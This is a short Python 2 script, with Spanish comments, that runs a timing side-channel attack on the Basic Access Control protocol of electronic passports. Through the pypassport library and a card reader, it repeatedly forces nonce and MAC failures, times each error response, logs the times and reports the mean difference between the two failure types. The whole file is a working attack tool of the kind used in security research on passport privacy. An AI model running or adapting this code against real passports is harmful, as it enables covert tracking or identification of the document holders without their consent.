# Copyright 2012 Antonio Lopez Vivar
#
#
# bac_attack is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# bac_attack is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with bac_attack.
# If not, see <http://www.gnu.org/licenses/>.

from pypassport import epassport, reader, hexfunctions
from pypassport.doc9303 import bac
import time

MRZ_target = "BB123456<1ESP1234567M1234567A1234567890<<<12" #Set a valid MRZ
FICHERO_LOG = "bac_attack.log"

print "\nBuscando lector..."
r = reader.ReaderManager().waitForCard()
print str(r) + "\n"

print "\nComenzando BAC-TIME-ATTACK... (CTRL + C para parar)"
file = open(FICHERO_LOG,"w")
i = 0
j = 0
n = 0.0
m = 0.0
while True:
	try:
		ep = epassport.EPassport(r, MRZ_target, 1) #Forzamos fallo del NONCE
		
		try:
			start = time.time()
			ep.doBasicAccessControl();
		except bac.BACException:
			n_i = time.time() - start
			n = n + n_i
			i = i + 1
			print "\n("+str(i)+")NONCE_ERROR tiempo respuesta: "+str(n_i)+"s"
			file.write(str(n_i))
		except Exception:
			print "("+str(i+1)+") ERROR DE LECTURA!"
		
		ep = epassport.EPassport(r, MRZ_target, 2) #Forzamos fallo de MAC
		
		try:
			start = time.time()
			ep.doBasicAccessControl();
		except bac.BACException:
			m_j = time.time() - start
			m = m + m_j
			j = j + 1
			print "("+str(j)+")MAC_ERROR tiempo respuesta: "+str(m_j)+"s"
			file.write("|"+str(m_j)+"\n")
		except Exception:
			print "("+str(j+1)+") ERROR DE LECTURA!"
		
	except KeyboardInterrupt:
		break

file.close()

print "\n\n\n\nNONCE_ERROR tiempo medio de respuesta: "+str(round(n/i, 4))+"s"
print "MAC_ERROR tiempo medio de respuesta: "+str(round(m/j, 4))+"s"
print "Diferencia de tiempos de respuesta medios: "+str(round(n/i - m/j, 4))+"s\n"
print "Tiempos de respuesta almacenados en fichero -> " + FICHERO_LOG
